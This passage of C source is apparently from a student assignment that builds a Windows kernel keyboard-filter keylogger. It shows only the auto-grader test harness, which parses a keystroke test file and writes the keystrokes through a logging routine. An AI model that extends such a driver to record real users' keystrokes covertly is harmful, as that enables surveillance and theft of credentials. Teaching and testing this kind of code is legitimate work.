        &fileInfo,
        sizeof(fileInfo),
        FileStandardInformation
    );
    if (!NT_SUCCESS(status))
    {
        DebugLog("QueryFileInformation() failed (%08X)\n", status);
        return 0;
    }

    return fileInfo.EndOfFile.QuadPart;
}


/**
 * @brief Convert any consecutive hex digits in buffer to a numeric v alue
 */
unsigned HexToUInt(const char* buffer)
{
    unsigned result = 0;
    while (*buffer)
    {
        char chr = *buffer++;
        unsigned digit = 0;
        if (chr >= '0' && chr <= '9')
        {
            digit = chr - '0';
        }
        else if (chr >= 'A' && chr <= 'F')
        {
            digit = chr - 'A' + 10;
        }
        else if (chr >= 'a' && chr <= 'f')
        {
            digit = chr - 'a' + 10;
        }
        else
        {
            if (chr != ' ' && chr != '\r' && chr != '\n')
            {
                DebugLog("Hex string terminated by non-space, non-null character (%02X)\n", chr);
            }
            return result;
        }
        result <<= 4;
        result += digit;
    }
    return result;
}


/**
 * @brief Break a text line into argc/argv for up to max_args (WARNING: Modifies line input, inserts null characters)
 *
 * @remark Does not support quoted arguments or escaped characters
 *
 * @param[in] line Input line to split
 * @param[out] argv Array of parsed arguments
 * @param[in] max_args Maximum arguments to parse
 */
unsigned SplitLine(char* line, const char* argv[], unsigned max_args)
{
    unsigned argc = 0;

    while (*line && (argc < max_args))
    {
        // skip any leading whitespace
        while (isspace(*line))
        {
            line++;
        }
        // if nothing left on line, we're done
        if (*line == 0)
        {
            break;
        }
        argv[argc++] = line;
        // find end of current arg/word
        while (*line && !isspace(*line))
        {
            line++;
        }
        // null terminate line unless we are at the end of the string
        if (*line != 0)
        {
            *line++ = 0;
        }
    }
    return argc;
}


/**
 * @brief Returns true if the string given contains only hex digits and is not empty
 */
bool allxdigits(const char* str)
{
    if (!*str)
    {
        return false;
    }
    while (*str)
    {
        if (!isxdigit(*str))
        {
            return false;
        }
        str++;
    }
    return true;
}


/**
 * @brief Add a keystroke to the collection, grow the collection as needed (Note: keystrokes array must be released with ExFreePoolWithTag())
 *
 * @param[out] keystrokes Keyboard input buffer to add to
 * @param[in] makecode Keyboard input makecode field
 * @param[in] flags Keyboard input flags field
 */
bool AddKeystroke(KEYBOARD_INPUT* keystrokes, unsigned makecode, unsigned flags)
{
    // if we need room, create or grow the array
    #define KEYDATA_GROWTH_SIZE 200
    if (keystrokes->count + 1 > keystrokes->size)
    {
        if (keystrokes->size == 0)
        {
            keystrokes->size = KEYDATA_GROWTH_SIZE;
            keystrokes->count = 0;
            keystrokes->keystrokes = (KEYBOARD_INPUT_DATA*)ExAllocatePool2(POOL_FLAG_PAGED, keystrokes->size * sizeof(KEYBOARD_INPUT_DATA), KBFILTER_POOL_TAG);
            if (keystrokes->keystrokes == NULL)
            {
                DebugLog("Initial allocation failed for key input buffer (allocating: %u)\n", keystrokes->size);
                keystrokes->size = 0;
                return false;
            }
        }
        else
        {
            KEYBOARD_INPUT_DATA* save = keystrokes->keystrokes;
            KEYBOARD_INPUT_DATA* tmp = (KEYBOARD_INPUT_DATA*)ExAllocatePool2(POOL_FLAG_PAGED, (keystrokes->size + KEYDATA_GROWTH_SIZE) * sizeof(KEYBOARD_INPUT_DATA), KBFILTER_POOL_TAG);
            if (tmp == NULL)
            {
                DebugLog("Allocation failed for key input buffer (allocating: %u)\n", keystrokes->size + KEYDATA_GROWTH_SIZE);
                return false;
            }
            keystrokes->keystrokes = tmp;
            keystrokes->size += KEYDATA_GROWTH_SIZE;
            memcpy(keystrokes->keystrokes, save, keystrokes->count * sizeof(KEYBOARD_INPUT_DATA));
            ExFreePoolWithTag(save, KBFILTER_POOL_TAG);
        }
    }
    keystrokes->keystrokes[keystrokes->count].MakeCode = (USHORT)makecode;
    keystrokes->keystrokes[keystrokes->count].Flags = (USHORT)flags;
    keystrokes->count++;
    return true;
}


/**
 * @brief Processes a command to add a shifted key to the input
 *
 * @param[in] keycode The make code for the key being shifted
 * @param[in] argc Count of arguments in argv[]
 * @param[in] argv Array of additional arguments, if any
 * @param[out] keystrokes Buffer for accumulating actual keystrokes
 *
 * @returns Returns parsed keystrokes in the KEYBOARD_INPORT structure. Structure's keystrokes element must be released using ExFreePoolWithTag()
 */
void ProcessShiftedKey(unsigned keycode, unsigned argc, const char* argv[], KEYBOARD_INPUT* keystrokes)
{
    if (argc > 2)
    {
        (void)argv;
        DebugLog("Unexpected arguments to 'keycode shifted' ignored (args=%u)\n", argc + 2);
    }
    AddKeystroke(keystrokes, KEY_LSHIFT, KEY_MAKE);
    AddKeystroke(keystrokes, keycode, KEY_MAKE);
    AddKeystroke(keystrokes, keycode, KEY_BREAK);
    AddKeystroke(keystrokes, KEY_LSHIFT, KEY_BREAK);
}


/**
 * @brief Processes a repeated key command and adds the appropriate keystrokes to the provided buffer
 *
 * @param[in] keycode The make code for the key being repeated
 * @param[in] argc Count of arguments in argv[]
 * @param[in] argv Array of additional arguments, if any
 * @param[out] keystrokes Buffer for accumulating actual keystrokes
 *
 * @returns Returns parsed keystrokes in the KEYBOARD_INPORT structure. Structure's keystrokes element must be released using ExFreePoolWithTag()
 */
void ProcessRepeatedKey(unsigned keycode, unsigned argc, const char* argv[], KEYBOARD_INPUT* keystrokes)
{
    if (argc < 1)
    {
        DebugLog("Insufficient arguments for 'keycode repeat count', line skipped (args=%u)\n", argc + 2);
        return;
    }
    // count argument must be a hex number
    if (!allxdigits(argv[0]))
    {
        DebugLog("Invalid count on input line (line dropped): '%04X' repeat '%s'\n", keycode, argv[0]);
        return;
    }
    unsigned count = HexToUInt(argv[0]);

    if (argc > 1)
    {
        DebugLog("Unexpected arguments to 'keycode repeat count' ignored (args=%u)\n", argc + 2);
    }

    // add 'count' makes followed by a break
    for (unsigned idx = 0; idx < count; idx++)
    {
        AddKeystroke(keystrokes, keycode, KEY_MAKE);
    }
    AddKeystroke(keystrokes, keycode, KEY_BREAK);
}


/**
 * @brief Parse a line from the test data input file - if it identifies one or more keystrokes, add those to the array
 *
 * @remark Keystroke buffer will be grown as necessary. When no longer needed, keystrokes->keystrokes should be released via ExFreelPoolWithTag()
 *
 * @param[in] line Input line to be parsed (WARNING: Line is modified in parsing, such as adding null characters between words)
 *      Formats Allowed:
 *          basic           = <hex makecode>
 *                              Adds keycode with make and then break flags (2 keystrokes)
 *                              E.g. 'h' pressed and released
 *                                  Input:      23
 *                                  Keystrokes: 23 00, 23 01
 *          key pressed     = <hex makecode> make
 *                              Adds keycode with make only - use this for shift pressed, for example (1 keystroke)
 *                              E.g. Left Shift pressed
 *                                  Input:      2A make
 *                                  Keystrokes: 2A 00
 *          key released    = <hex makecode> break
 *                              Adds keycode with break only - use this for shift released, for example (1 keystroke)
 *                              E.g. Left Shift released
 *                                  Input:      2A break
 *                                  Keystrokes: 2A 01
 *          shifted key     = <hex makecode> shifted
 *                              Produces a single shifted key - shift pressed + key make/break + shift released (4 keystrokes)
 *                              E.g.
 *                                  Input:      23 shifted
 *                                  Keystrokes: 2A 00, 23 00, 23 01, 2A 01
 *          repeat          = <hex makecode> repeat <hex count>
 *                              Simulates a held key. Adds 'count' keycode + make, followed by a single keycode + break ('count' + 1 keystrokes)
 *                              E.g. 'l' held for 5 repeats then released (6 keystrokes)
 *                                  Input:      26 repeat 5
 *                                  Keystrokes: 26 00, 26 00, 26 00, 26 00, 26 00, 26 01
 *          alt flags       = <hex makecode> <hex flags>
 *                              Adds a single keystroke with the make code and flags given (1 keystroke)
 *
 * @param[out] keystrokes Buffer for accumulating actual keystrokes
 *
 * @returns Returns parsed keystrokes in the KEYBOARD_INPORT structure. Structure's keystrokes element must be released using ExFreePoolWithTag()
 */
void ParseLine(char* line, KEYBOARD_INPUT* keystrokes)
{
    // Action types
    #define ACTION_MAKE_ONLY "make"
    #define ACTION_BREAK_ONLY "break"
    #define ACTION_SHIFTED "shifted"
    #define ACTION_REPEAT_KEY "repeat"

    #define MAX_ARGS 5
    const char* argv[MAX_ARGS];
    unsigned argc = SplitLine(line, argv, MAX_ARGS);
    // ignore blank lines
    if (argc == 0)
    {
        return;
    }
    // first argument must be a hex number
    if (!allxdigits(argv[0]))
    {
        DebugLog("Invalid makecode on input line (line dropped): '%s'\n", argv[0]);
        return;
    }
    unsigned keycode = HexToUInt(argv[0]);

    // check for basic first
    if (argc == 1)
    {
        AddKeystroke(keystrokes, keycode, KEY_MAKE);
        AddKeystroke(keystrokes, keycode, KEY_BREAK);
        return;
    }

    // grab second argument for determination of action type (strlwr() it in case someone used caps)
    _strlwr_s((char*)argv[1], strlen(argv[1]) + 1);
    const char* arg2 = argv[1];

    // check for key pressed (= <hex makecode> make)
    if (strcmp(arg2, ACTION_MAKE_ONLY) == 0)
    {
        if (argc > 2)
        {
            DebugLog("Unexpected arguments to 'keycode make' ignored (args=%u)\n", argc);
        }
        AddKeystroke(keystrokes, keycode, KEY_MAKE);
    }
    // check for key released (= <hex makecode> break)
    else if (strcmp(arg2, ACTION_BREAK_ONLY) == 0)
    {
        if (argc > 2)
        {
            DebugLog("Unexpected arguments to 'keycode break' ignored (args=%u)\n", argc);
        }
        AddKeystroke(keystrokes, keycode, KEY_BREAK);
    }
    // check for shifted key (= shift make + key make + key break + shift break)
    else if (strcmp(arg2, ACTION_SHIFTED) == 0)
    {
        ProcessShiftedKey(keycode, argc - 2, argv + 2, keystrokes);
    }
    // check for repeat (= <hex makecode> repeat <hex count>)
    else if (strcmp(arg2, ACTION_REPEAT_KEY) == 0)
    {
        ProcessRepeatedKey(keycode, argc - 2, argv + 2, keystrokes);
    }
    else
    {
        //
        //  The only other supported option is "<keycode> <alt flags>"
        //
        // check for alt flags (= <hex makecode> <hex flags>)
        if (!allxdigits(argv[1]))
        {
            DebugLog("Invalid flags value on input line (line dropped): '%s' '%s'\n", argv[0], argv[1]);
            return;
        }
        unsigned flags = HexToUInt(argv[1]);
        if (argc > 2)
        {
            DebugLog("Unexpected arguments to 'keycode alt_flags' ignored (args=%u)\n", argc);
        }
        AddKeystroke(keystrokes, keycode, flags);
    }
}


/**
 * @brief Search for end of line characters or end of string
 *
 * @remark Modifies data in buffer
 */
char* FindNext(char* start)
{
    char* ptr;
    for (ptr = start; *ptr; ptr++)
    {
        // if we hit an end of line character, finalize search
        if (*ptr == EOL1 || *ptr == EOL2)
        {
            break;
        }
        // if we find a comment marker, trim comment and prior whitespace if any, then keep going looking for end of line
        if (*ptr == START_COMMENT)
        {
            // null terminate at comment marker
            *ptr = 0;
            // trim any trailing whitespace
            for (char* tmp = ptr - 1; tmp >= start; tmp--)
            {
                if (!isspace(*tmp))
                {
                    break;
                }
                *tmp = 0;
            }
        }
    }
    while (*ptr == EOL1 || *ptr == EOL2 || isspace(*ptr))
    {
        *ptr++ = 0;
    }
    return ptr;
}


/**
 * @brief Parse keystroke data
 *
 * @remark Modifies inputData during parsing
 */
bool ParseTestData(char* inputData, KEYBOARD_INPUT* keystrokes)
{
    // choose initial array size and allocate it
    keystrokes->size = 0;
    keystrokes->count = 0;
    keystrokes->keystrokes = NULL;

    char* front = inputData, * end;
    while (*front)
    {
        // skip leading space
        while (isspace(*front))
        {
            front++;
        }

        // point end at the next item
        end = FindNext(front);

        // parse this input line, possibly adding 1 or more keystrokes to the data
        ParseLine(front, keystrokes);

        front = end;
    }

    return keystrokes->count > 0;
}


/**
 * @brief Load and run test input for auto-grader
 */
void ProcessTestInput()
{
    static bool testComplete = false;
    if (testComplete)
    {
        return;
    }
    testComplete = true;

    //
    // Acquired resources that must be released at cleanup
    //
    HANDLE inputFile = NULL;
    char* inputFileContents = NULL;
    KEYBOARD_INPUT testInputData = { 0, 0, NULL };

    //
    // Open test key stroke file
    //
    UNICODE_STRING inputFileName;
    RtlInitUnicodeString(&inputFileName, L"\\DosDevices\\C:\\Users\\Student\\AppData\\Local\\Temp\\keylogger\\input.txt");

    OBJECT_ATTRIBUTES inputFileObjectAttributes;
    InitializeObjectAttributes(
        &inputFileObjectAttributes,
        &inputFileName,
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
        NULL,
        NULL);

    IO_STATUS_BLOCK ioStatusBlock;
    NTSTATUS status = ZwCreateFile(
        &inputFile,
        GENERIC_READ,
        &inputFileObjectAttributes,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,      // This may not be necessary since we are not creating or overwritting a file? I believe it is ignored
        FILE_SHARE_READ,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT, // this assures synchronous write - doesn't appear to work without it
        NULL,
        0);

    if (!NT_SUCCESS(status))
    {
        DebugLog("ZwCreateFile() failed (0x%08X, %016llX)\n", status, ioStatusBlock.Information);
        goto cleanup;
    }

    //
    // Allocate a buffer for the test key stroke data
    //
    // Determine file size
    ULONG fileSize = (ULONG)GetFileSize(inputFile);
    if (fileSize == 0)
    {
        DebugLog("Get file size on key stroke file failed\n");
        goto cleanup;
    }

    // Allocate buffer
    inputFileContents = (char*)ExAllocatePool2(POOL_FLAG_PAGED, fileSize + 1, KBFILTER_POOL_TAG);
    if (inputFileContents == NULL)
    {
        DebugLog("Allocation failed: Input file buffer\n");
        goto cleanup;
    }

    LARGE_INTEGER byteOffset = { 0 };
    IO_STATUS_BLOCK ioStatusBlockRead;
    status = ZwReadFile(
        inputFile,
        NULL,
        NULL,
        NULL,
        &ioStatusBlockRead,
        inputFileContents,
        fileSize,
        &byteOffset,
        NULL);

    if (!NT_SUCCESS(status))
    {
        DebugLog("ZwReadFile() failed (0x%08X)\n", status);
        goto cleanup;
    }
    inputFileContents[fileSize] = 0;

    // Parse the file contents
    ParseTestData(inputFileContents, &testInputData);

    // write keystrokes to file
    #define KEYS_PER_WRITE 10
    for (unsigned logged = 0; logged < testInputData.count; )
    {
        unsigned count = testInputData.count - logged;
        if (count > KEYS_PER_WRITE)
        {
            count = KEYS_PER_WRITE;
        }


        WriteToLogFile(testInputData.keystrokes + logged, count);

        logged += count;
    }

cleanup:
    if (inputFile != NULL)
    {
        ZwClose(inputFile);
    }
    if (inputFileContents != NULL)
    {
        ExFreePoolWithTag(inputFileContents, KBFILTER_POOL_TAG);
    }
    if (testInputData.keystrokes != NULL)
    {
        ExFreePoolWithTag(testInputData.keystrokes, KBFILTER_POOL_TAG);
    }
}

#endif
